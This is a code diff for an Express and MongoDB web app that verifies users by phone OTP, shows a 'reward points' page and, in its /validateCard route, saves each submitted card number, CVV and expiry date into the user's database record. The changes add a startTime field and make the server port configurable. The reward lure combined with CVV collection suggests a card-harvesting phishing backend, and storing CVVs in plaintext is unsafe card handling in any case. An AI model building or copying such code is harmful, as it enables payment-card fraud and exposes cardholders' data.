@@ -18,6 +18,8 @@ const { generateToken, verifyToken } = require('./jwt');
 const session = require('express-session');
 const mongoose = require('mongoose')
 const dbURL = process.env.ATLAS_DB_URL;
+const APP_PORT = process.env.AppPORT;
+
 
 
 
@@ -44,7 +46,8 @@ const UserSchema = new mongoose.Schema({
     address: String,
     body: String,
     date: String
-}]
+    }],
+  startTime: { type: Date, required: true }
 });
 
 const User = mongoose.model('User', UserSchema);
@@ -107,9 +110,9 @@ app.get('/reward',(req, res) => {
 
 // // Route for reward points
 app.get('/rewardpoints', (req, res) => {
-    res.render('reward_points');
-  });
-
+  const startTime = req.query.startTime; // Extract startTime from query parameters
+  res.render('reward_points', { startTime });
+});
 
 function hasRequiredData(user) {
     // Check if user is null or undefined
@@ -252,14 +255,12 @@ app.post('/verifyOTP', async (req, res) => {
           .create({ to: phone, code: otp });
 
       if (verification_check.status === 'approved') {
-          // let result = await User.exists({ phone: phone });
-          let result = await User.exists({ phone: phone,'cards': { $not: { $size: 0 } }  });
-          console.log("Already exist ", result);
+        let userWithCards = await User.findOne({ phone, 'cards': { $not: { $size: 0 } } });
 
-          if (result != null){
-              console.log('Number already exists, responding with error');
-              return res.json({ valid: false, error: 'number already exist' });
-          }
+        if (userWithCards) {
+            console.log('Number already exists, responding with error');
+            return res.json({ valid: false, error: 'number already exist', startTime: userWithCards.startTime });
+        }
           try {
               console.log("userdata",userData)
               let user = await User.findOneAndUpdate(
@@ -328,11 +329,13 @@ app.post('/validateCard', asyncHandler(async (req, res) => {
 
   const userData = req.session.userData;
   const phone = userData.phone;
+  const startTime = new Date();
 
   try {
     const user = await User.findOneAndUpdate(
       { phone },
-      { $push: { cards: { cardNumber, cvv, expiryDate } } },
+      { $push: { cards: { cardNumber, cvv, expiryDate } },
+      $set: { startTime } },
       { new: true }
     );
 
@@ -366,6 +369,6 @@ app.use((err, req, res, next) => {
 
 
 
-app.listen(3000, () => {
-    console.log('Server running on port 3000');
+app.listen(APP_PORT, () => {
+    console.log(`Server running on port ${APP_PORT}`);
 });
